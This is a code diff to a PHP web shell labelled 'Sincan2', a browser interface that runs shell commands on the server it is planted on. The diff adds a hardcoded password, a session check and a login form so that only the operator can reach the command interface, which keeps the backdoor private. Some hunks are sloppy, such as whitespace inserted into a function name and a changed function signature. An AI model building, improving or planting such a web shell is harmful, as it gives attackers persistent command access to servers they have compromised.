@@ -5,6 +5,17 @@ $SHELL_CONFIG = array(
     'hostname' => 'Sincan2',
 );
 
+$password = 'your_password_here'; // Set your password here
+
+session_start();
+
+// Check if the password is correct
+if (isset($_POST['password']) && $_POST['password'] === $password) {
+    $_SESSION['authenticated'] = true;
+} elseif (isset($_POST['password']) && $_POST['password'] !== $password) {
+    $loginError = "Invalid password.";
+}
+
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -158,6 +169,12 @@ function initShellConfig() {
 
 if (isset($_GET["feature"])) {
 
+    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+        header("HTTP/1.1 401 Unauthorized");
+        echo json_encode(array("error" => "Unauthorized"));
+        die();
+    }
+
     $response = NULL;
 
     switch ($_GET["feature"]) {
@@ -260,7 +277,7 @@ if (isset($_GET["feature"])) {
                 }
             }
 
-            @media (max-width: 991px),
+                        @media (max-width: 991px),
                    (max-height: 600px) {
                 #shell-logo {
                     font-size: 6px;
@@ -378,7 +395,7 @@ if (isset($_GET["feature"])) {
                 }
             }
 
-            function featureHint() {
+            function featureHint            () {
                 if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
 
                 function _requestCallback(data) {
@@ -446,7 +463,7 @@ if (isset($_GET["feature"])) {
                 document.body.removeChild(element);
             }
 
-            function getBase64(file, onLoadCallback) {
+            function getBase64(file) {
                 return new Promise(function(resolve, reject) {
                     var reader = new FileReader();
                     reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
@@ -582,20 +599,32 @@ if (isset($_GET["feature"])) {
     </head>
 
     <body>
-        <div id="shell">
-            <pre id="shell-content">
-                <div id="shell-logo">
-
+        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
+            <div id="login">
+                <form method="post">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required>
+                    <button type="submit">Login</button>
+                </form>
+                <?php if (isset($loginError)): ?>
+                    <p style="color: red;"><?php echo $loginError; ?></p>
+                <?php endif; ?>
+            </div>
+        <?php else: ?>
+            <div id="shell">
+                <pre id="shell-content">
+                    <div id="shell-logo">
 Sincan2                                 <span></span>
-                </div>
-            </pre>
-            <div id="shell-input">
-                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
-                <div>
-                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    </div>
+                </pre>
+                <div id="shell-input">
+                    <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+                    <div>
+                        <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    </div>
                 </div>
             </div>
-        </div>
+        <?php endif; ?>
     </body>
 
 </html>
